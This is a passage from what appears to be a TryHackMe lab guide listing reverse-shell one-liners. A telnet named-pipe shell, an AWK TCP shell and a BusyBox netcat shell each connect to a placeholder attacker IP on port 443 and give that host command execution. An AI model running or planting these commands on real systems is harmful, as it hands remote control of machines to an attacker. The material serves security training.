target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```
This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443. 
---
### AWK
```bash
target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
This reverse shell uses AWK’s built-in TCP capabilities to connect to ATTACKER_IP:443. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.
---
### BusyBox

```bash
target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
```
This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker.
---
**Q
